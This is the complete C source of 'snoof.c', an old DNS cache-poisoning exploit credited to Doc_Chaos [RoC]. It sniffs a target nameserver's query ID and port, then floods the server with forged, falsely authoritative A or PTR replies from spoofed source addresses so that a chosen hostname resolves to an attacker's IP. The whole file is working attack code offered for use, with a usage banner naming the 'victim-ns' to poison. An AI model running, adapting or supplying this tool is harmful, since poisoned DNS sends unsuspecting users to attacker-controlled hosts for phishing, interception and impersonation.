/* 
* snoof.c v1.0 (c) Doc_Chaos [RoC]
*
* Based on ADM's "ADMsnOOfID" code.  This has been almost completely
* recoded, for better performance, BIND 8 compatibility, user defined
* TTL and less useless debugging crap on your screen.
*
* This code is full of potential buffer overruns, null pointer derefs,
* and cases where data is taken from the network and either printed or
* stuffed into a buffer with next to no sanity checking.  If this were
* a daemon and not an exploit, the programmer should be shot.  I know
* this code sucks.  Now you do too.  Use it with care.  Don't make it
* suid root on your public shell server.
*/

/* 
*  We normally invoke dig to check on spoof after done spoofing.  If you
*  don't like that, undef this.  If your dig is someplace odd and not 
*  pathed, you may put the path here.
*/

#define  AUTODIG "dig"

#include <arpa/inet.h>
#include <memory.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "dns.h"
#include "ip.h"
#include "udp.h"

#define   ERROR -1
#define   DNSHDRSIZE 12
#define   TYPE_A   1
#define   TYPE_PTR 12
#define	  CLASS_IN 1
#define   IPHDRSIZE     sizeof(struct iphdr)
#define   UDPHDRSIZE    sizeof(struct udphdr)

unsigned serverport=1024;	/* bind 8 default */
unsigned long ttl=300;		/* default TTL    */

void trigger_id_query(char *mydomain, unsigned long d_ip);
int make_question_packet(char *data, char *name, int type);
int make_answer_packet(char *data, char *name, char *ip, int type, unsigned long ttl);
void dnsspoof(char *dnstrust,char *victim,char *spoofname,char *spoofip,int ID,int type);
int myrand(void);
unsigned long resolve(char *host);
void send_qa(u_long s_ip, u_long d_ip, char *name, char *spoofip, int ID, int type);
int udp_send(int s, unsigned long saddr, unsigned long daddr,unsigned short sport,unsigned short dport,char *datagram, unsigned datasize);
void nameformatIP(char *ip, char *resu);

/* default: we will change this to 0 if devname contains "ppp" */
/* yes, this means this thing probably won't work on ARCnet,   */
/* token ring, ATM, HIPPI, etc.  If you have access to such    */
/* equipment, please feel free to fix my c0de.                 */

int ETHHDRSIZE = 14;
                     
int main(int argc, char *argv[])
{
	struct pcap_pkthdr h;
	struct pcap *pcap_d;
	struct   iphdr  *ip;
	struct   udphdr *udp;
	struct   dnshdr *dnsrecv;
	char            *data;
	char            *buffer;
	char            ebuf[255];
	char            spoofip[255];
	char		spoofname[255];
	char            bla[255];
	char            dnstrust[255];
	unsigned long   s_ipns;
	unsigned long   d_ip;                     
	unsigned long   timer; 
	struct in_addr	ia;

	int  i,type,nq,class,resplen;
	unsigned queryid;	

	srand((time(NULL) % random() * random()));

	puts("\nsnoof v1.0 (c) Doc_Chaos [RoC]\n");

	if(argc < 8)
	{
		puts("Based on ADMsnOOfID by ADM, almost completely recoded and now featuring\nuser-defined TTL and BIND 8 spoofing capability.\n");
		printf("usage : %s <device> <victim-ns> <yourdomain> <yourNS> <type> <spoofname> <spoofip> <authns> [ttl]\n\n",argv[0]); 
		puts("Cast of characters:\n");
		puts("device     = the device we will use (eth/ppp)");
		puts("victim-ns  = the nameserver we want to poison");
		puts("yourdomain = any domain served by yourNS");
		puts("yourNS     = the primary IP address of the your NS");
		puts("type       = 1 (A-record) or 12 (PTR-record)");
		puts("spoofname  = the name you want to spoof as");
		puts("spoofip    = the IP you want spoofname to resolve to");
		puts("authns     = nameserver authoritative for spoofname (A) or spoofip (PTR)");
		puts("ttl        = spoof's time-to-live (seconds, default 300)\n");
		puts("victim-ns, spoofip and authns may be IP numbers or hostnames.\n");
		exit(0);
	}

	if(strstr(argv[1],"ppp")) ETHHDRSIZE = 0;

	type=atoi(argv[5]);
	if (type != 1 && type != 12)
	{
		printf("Record type %d not implemented.\n");
		exit(1);
	}

/* stack smash #1 of many */
	strcpy(spoofname,argv[6]);

	ia.s_addr=resolve(argv[7]);
	strcpy(spoofip,inet_ntoa(ia));
	ia.s_addr=resolve(argv[8]);
	strcpy(dnstrust,inet_ntoa(ia));

	if (argc == 10 && (timer=atol(argv[9])) > 0) ttl=timer;

/* start snarfing packets.  note: always a good idea to directly pass */
/* user-supplied data to privileged library functions.                */

	pcap_d = pcap_open_live(argv[1],1024,0,100,ebuf);

/* Here we go, watch carefully. */

	s_ipns = resolve(argv[4]);
	d_ip   = resolve(argv[2]);

/* 
*  Ask victim-ns about a domain we're authoritative for.  It will then
*  hopefully ask us about that domain, and we can find out what its current
*  query id number is, and what port it makes outbound queries on.  We then
*  wait for it to ask, forever if need be.  We'll set a timer, and ask the
*  question every 15s until we get the packet or the luser aborts.
*/

	printf("Sending question to get remote query_id and port...\n");
	trigger_id_query(argv[3],d_ip);
	timer=time(NULL);

	while(1)	/* forever and stuff */
	{ 
		buffer = (u_char *)pcap_next(pcap_d,&h); /* catch the packet */  

/* holy typecasts batman */
 
		ip      = (struct iphdr   *)(buffer+ETHHDRSIZE);
		udp     = (struct udphdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE);
		dnsrecv = (struct dnshdr  *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE);
		data    = (char *)(buffer+ETHHDRSIZE+IPHDRSIZE+UDPHDRSIZE+DNSHDRSIZE);

/* Here we have a lame little dec0der to make the packets look nice */
/* While we are waiting for the victim-ns to take our sucker bait   */
/* we will show the luser some nice things to look at, cuz he most  */
/* likely has a pretty short attention span.                        */

		if(ip->protocol == IPPROTO_UDP && udp->dest == htons(53))
		{
			printf("[%s:%i ->",inet_ntoa(ip->saddr),ntohs(udp->source));
			printf(" %s:%i] ",inet_ntoa(ip->daddr),ntohs(udp->dest));
			if (dnsrecv->qr == 0)
			{
				nq = ntohs(dnsrecv->que_num);
				if (nq < 0) nq=0;
				printf("%dQ: ",nq);
				while (nq--)
				{
					bla[0]=0;
					while (*data)
					{
						strncat(bla,(char *)(data+1),(int)(*data));
						strcat(bla,".");
						data += (int)(*data)+1;
					}
					data += 4;	/* skip over CLASS and TYPE cuz we dun care */
					printf("%s ",bla);
				}
				printf("\n");
			}
			else
			{
/* decoding RRs is kinda hard and I am kinda lazy so we will just count em */
				nq = ntohs(dnsrecv->num_rr);
				printf("%dA: decode not implemented.\n",nq);
			}
		}

/* 
*  Now, while the luser's trying to figure out what he's lookin 
*  at, we'll take a look at the packet and see if it's interesting.
*  If the victim-ns has taken our bait, spoof 'em and exit. 
*/

		if(ip->protocol == IPPROTO_UDP && ip->saddr.s_addr == d_ip && ip->daddr.s_addr == s_ipns  && udp->dest  == htons(53) && dnsrecv->qr == 0 )
		{
			printf("Ok, they took the bait, now we Own em...\n");
		    
			serverport = ntohs(udp->source);
			queryid = ntohs(dnsrecv->id);    /* we get the id         */

/* 
*  Tell the luser the serverport and queryid.  If the luser is smart, he
*  will use this information to determine why he's having trouble, in case
*  this bitch don't work.  If he's not smart, he probably won't even be
*  reading this c0de.
*/

			printf("victim-ns : %s\n",argv[2]);
			printf("serverport: %u\n",serverport);
			printf("query_id  : %u\n",queryid);
			printf("spoof_name: %s\n",spoofname);
			printf("spoof_ip  : %s\n",spoofip);
			printf("ttl       : %lu\n",ttl);
			printf("auth-ns   : %s\n",dnstrust);
	
/* send the spoof and exit */
			dnsspoof(dnstrust,argv[2],spoofname,spoofip,queryid,type); 
#ifdef AUTODIG
			sprintf(dnstrust,"%s @%s %s%s IN %s",AUTODIG,argv[2],type==TYPE_PTR?"-x ":"",type==TYPE_PTR?spoofip:spoofname,type==TYPE_PTR?"PTR":"A");
			system(dnstrust);	/* I know */
#endif	
			exit(0);
		}    

/*
*  If they haven't taken the bait, check our timer.  We'll give them 15
*  seconds, then we'll assume that the packet was lost or they asked someone else,
*  and we'll try resending the question and hope for the best.
*/

		if ((time(NULL) - timer) >= 15)
		{
			timer=time(NULL);
			printf("\nTimed out waiting for sucker query, resending question.\n");
			trigger_id_query(argv[3],d_ip);
		}

	}
	return(0);	/* not reached -- just here to make egcs happy. */
}

/*
*  trigger_id_query: formulate and spoof a request for the A-record of a non
*  existing host in a domain we're authoritative for.  Send said request to
*  victim-ns, hopefully eliciting the favor of a query directed at the 
*  nameserver we're sniffing.  The main loop will wait for such a query after
*  sending this fake question, and will therefore (hopefully) get the query id
*  and port of the remote NS.  Some things can go wrong here.  For example, if 
*  more than one NS is authoritative for the domain, the victim-ns may ask that
*  one instead of the one we're sniffing.  If that happens, trying again may be
*  of assistance.  There is a timeout mechanism in the main loop that will retry
*  every 15s until it succeeds or the luser aborts.
*
*  Another possible point of failure is that some NS's only allow recursive
*  queries from certain hosts.  If this is the case, no number of retries will 
*  help you, and this program will stall forever waiting for the victim to take
*  the bait.  You may be able to fix this by changing this function so that it
*  spoofs the initial query from a host that the NS should provide recursive
*  query access to.  Of course, if the site has restricted recursive queries, 
*  they have probably also placed anti-spoofing filters at their router 
*  or firewall, but it may be worth a shot.  If you can't figure out how to
*  change the spoof host, go back to AOL.  It's safer there.
*/

void trigger_id_query(char *mydomain, unsigned long d_ip)
{
	char *namefake;
	struct   dnshdr *dnssend;
	unsigned long spoof_ip;
	
	if ((namefake=malloc(255))==NULL)
	{
		puts("Memory allocation failure in trigger_id_query");
		exit(1);
	}
	sprintf(namefake,"%d%d%d.%s",myrand(),myrand(),myrand(),mydomain); 
	spoof_ip = resolve("209.127.0.53");
	send_qa(spoof_ip, d_ip, namefake, NULL, 0, TYPE_A);
	free(namefake);
}

/*  bleh.  */

int myrand(void)
{
	int j; 
	j=1+(int) (150.0*rand()/(RAND_MAX+1.0));
	return(j);
}

/*
*  A simple error checking name resolver.  Tries a gethostbyname() and
*  bails if it don't work.  Returns the u_long IP address if it works.
*  The original c0de upon which this is based would provide sometimes
*  very entertaining but unproductive results when handed something that
*  failed to resolve.
*/

unsigned long resolve(char *host)
{
	struct sockaddr_in sinn;
	struct hostent *hent;
      
	if ((hent=gethostbyname(host))==NULL) 
	{
		printf("Unable to resolve host %s\n",host);
		exit(1);
	}
	bzero((char *)&sinn, sizeof(sinn));
	bcopy(hent->h_addr, (char *)&sinn.sin_addr, hent->h_length);
	return sinn.sin_addr.s_addr;
}

/*
*  nameformat takes a pointer to a FQDN and converts it to the internal
*  format used in DNS query/reply packets.  If you wanna know about that
*  format, read the RFC or the c0de.  Original code used lots of for()
*  loops and big static buffers, I use library functions and malloc.
*  It's more readable that way, which is good, becuz now you skript kiddiez
*  can maybe learn how some of this shit really works.
*/
  
void nameformat(char *name, char *QS)
{
        char *bungle,*x;
        char elem[128];

	*QS = 0;
        bungle=malloc(strlen(name)+3);
        strcpy(bungle,name);
        x=strtok(bungle,".");
        while (x != NULL)
        {
                if (snprintf(elem,128,"%c%s",strlen(x),x) == 128)
                {
                        puts("String overflow.");
                        exit(1);
                }
                strcat(QS,elem);
                x=strtok(NULL,".");
        }
	free(bungle);
}

/*
*  nameformatIP is a relatively bastardish function.  You give it a standard
*  dotted-quad IP and it will turn it into reversed in-addr.arpa notation,
*  nameformat() it and stuff it into a buffer for you.  There might be an 
*  easier way to do this, but then, I never took any algorithms courses.
*
*  The original version of this was a two-and-a-half page long atrocity of
*  for()s and lots of big static buffers.  Using a little array of pointers
*  is much nicer.  We'll politely bail if for some reason there are too many 
*  elements to stuff into the array.  That's not likely to happen, but if it
*  did it wouldn't be pretty.
*/

void nameformatIP(char *ip, char *resu)
{
	char *reverse, *temp, *x, *comps[10];
	int px=0;

	temp=malloc(strlen(ip)+3);
	reverse=malloc(strlen(ip)+30);
	bzero(reverse,strlen(ip)+30);
	strcpy(temp,ip);
	x=strtok(temp,".");
	while (x != NULL)
	{
		if (px >= 10)
		{
			puts("dumbass, wtf you think this is, IPV6?");
			exit(1);
		}
		comps[px++]=x;
		x=strtok(NULL,".");
	}
	for (px-- ;px >= 0; px--)
	{
		strcat(reverse,comps[px]);
		strcat(reverse,".");
	}
	strcat(reverse,"in-addr.arpa");
	nameformat(reverse,resu);
	free(temp);
	free(reverse);
}   

/*
*  this guy just makes up a question packet.  give it a name, a type, and
*  a pointer to where you want the packet payload written.  It will format
*  the name for you.
*/

int make_question_packet(char *data, char *name, int type)
{
	if(type == TYPE_A )
	{
		nameformat(name,data);
		*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_A);
	}

	if(type == TYPE_PTR){
		nameformatIP(name,data);
		*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
	}
        
	*( (u_short *) (data+strlen(data)+3) ) = htons(CLASS_IN); 
	return(strlen(data)+5);   
}

/*
*  The following convoluted mess generates an answer packet, either an A or a
*  PTR. Takes a user-specified name, IP, type and TTL, and writes the packet
*  to a user provided buffer.
*/

int make_answer_packet(char *data, char *name, char *ip, int type, unsigned long ttl)
{
	int i;
	char *ans;

	if(type == TYPE_A)
	{
		/* Fill out the QUESTION section */
		nameformat(name,data);
		*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_A);
		*( (u_short *) (data+strlen(data)+3) ) = htons(CLASS_IN);        
		i=strlen(data)+5;

		/* Fill out the ANSWER section */
		strcpy(data+i,data);
		i=i+strlen(data)+1;    
		*((u_short *) (data+i))      = htons(TYPE_A);
		*((u_short *) (data+i+2))    = htons(CLASS_IN);
		*((u_long *) (data+i+4))    = htonl(ttl);
		*((u_short *) (data+i+8))    = htons(4);	/* length of ip address */
		*((u_long *) (data+i+10))   = resolve(ip);
		return(i+14);
	}

	if(type == TYPE_PTR)
	{
		/* Fill out the QUESTION */
		nameformatIP(ip,data);
		*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
		*( (u_short *) (data+strlen(data)+3) ) = htons(CLASS_IN);  

		/* Fill out the ANSWER section */
		i=strlen(data)+5;
		strcpy((data+i),data);
		i=(i+strlen(data)+1);
		*((u_short *) (data+i))     = htons(TYPE_PTR);
		*((u_short *) (data+i+2))   = htons(CLASS_IN);
		*((u_long *) (data+i+4))    = htonl(ttl);
		ans = data+i+10;
		nameformat(name,ans);
		*((u_short *) (data+i+8))   = htons(strlen(ans)+1);
		return(i+11+strlen(ans));
	}
}

void send_qa(u_long s_ip, u_long d_ip, char *name, char *spoofip, int ID, int type)
{
	struct dnshdr *dns;
	char *data,*packet;
	int i,on=1,sraw;

	if((sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR)
	{
		perror("socket");
		exit(ERROR);
	}
   
	if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR)
	{
		perror("setsockopt");
		exit(ERROR);
	}

	if ((packet = malloc(1024))==NULL)
	{
		puts("Allocation failure in send_question");
		exit(1);
	}

	dns  = (struct dnshdr *)packet;
	data = (char *)(packet+DNSHDRSIZE);
	bzero(packet,1024);

	dns->rd      = 1;		/* rd = 1: bind 8 checks this	 */
	dns->que_num = htons(1);	/* sending one question (yep)    */

	if (spoofip == NULL)	/* sending a question */
	{	
		dns->id      = 6000+myrand();	/* random query id	     */
		dns->qr      = 0;		/* qr = 0: question packet   */
		dns->aa      = 0;		/* aa = 0: not auth answer   */
		dns->rep_num = htons(0);	/* sending no replies        */
		i=make_question_packet(data,name,type);
		udp_send(sraw,s_ip,d_ip,1337+myrand(),53,packet,DNSHDRSIZE+i);
	}
	else
	{
		dns->id      = htons(ID);	/* the query id */
		dns->qr      = 1;		/* qr = 1: we're sending a reply */
		dns->aa      = 1;		/* aa = 1: lie and say we're authoritative */
		dns->rep_num = htons(1);	/* sending an answer */
		i=make_answer_packet(data,name,spoofip,type,ttl);
		udp_send(sraw,s_ip,d_ip,53,serverport,packet,DNSHDRSIZE+i);
	}
	close(sraw);       
	free(packet);
}                                   

void dnsspoof(char *dnstrust,char *victim,char *spoofname,char *spoofip,int ID,int type)
{
	u_long fakeip;
	u_long trustip;
	u_long victimip;
	int loop,rere;
     
	trustip  = resolve(dnstrust);
	victimip = resolve(victim); 
	fakeip   = resolve("209.127.0.53");
    
	puts("sending question to initiate caching...");
	for(loop=0;loop<4;loop++) send_qa(fakeip,victimip,type == TYPE_PTR?spoofip:spoofname,NULL,0,type);
        
	puts("sending replies..."); 
	for(rere = 0; rere < 2;rere++)
	{
		for(loop=0;loop < 80;loop++)
		{
			printf(".");
			send_qa(trustip,victimip,spoofname,spoofip,ID+loop,type);
		}
	}
	puts("\nspoof sent.\n");
}

/*****************************************************************************/
/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
/*****************************************************************************/

unsigned short in_cksum(char *packet, int len)
{
	register int nleft = len;
	register u_short *w = (u_short *)packet;
	register int sum = 0;
	u_short answer = 0;

	/*
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  
	{
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft == 1)
	{
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16);         /* add carry */
	answer = ~sum;              /* truncate to 16 bits */
	return(answer);
}

int udp_send(int s, unsigned long saddr, unsigned long daddr,unsigned short sport,unsigned short dport,char *datagram, unsigned datasize) 
{
	struct sockaddr_in sin;
	struct   iphdr   *ip;
	struct   udphdr  *udp;
	unsigned char    *data;
	unsigned char    packet[4024];
	 
	ip     = (struct iphdr     *)packet; 
	udp    = (struct udphdr    *)(packet+IPHDRSIZE);
	data   = (unsigned char    *)(packet+IPHDRSIZE+UDPHDRSIZE);
	       
	memset(packet,0,sizeof(packet));

	udp->source  = htons(sport); 
	udp->dest    = htons(dport);
	udp->len     = htons(UDPHDRSIZE+datasize);
	udp->check   = 0;         

	memcpy(data,datagram,datasize);
	
	ip->saddr.s_addr  = saddr;
	ip->daddr.s_addr  = daddr;
	ip->version  = 4;
	ip->ihl      = 5;
	ip->ttl      = 245;
	ip->id       = random()%5985;
	ip->protocol = IPPROTO_UDP;
	ip->tot_len  = htons(IPHDRSIZE + UDPHDRSIZE + datasize);
	ip->check    = 0;
	ip->check    = in_cksum((char *)packet,IPHDRSIZE);

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=daddr;
	sin.sin_port=udp->dest;
		
	return(sendto(s, packet, IPHDRSIZE+UDPHDRSIZE+datasize, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)));
}
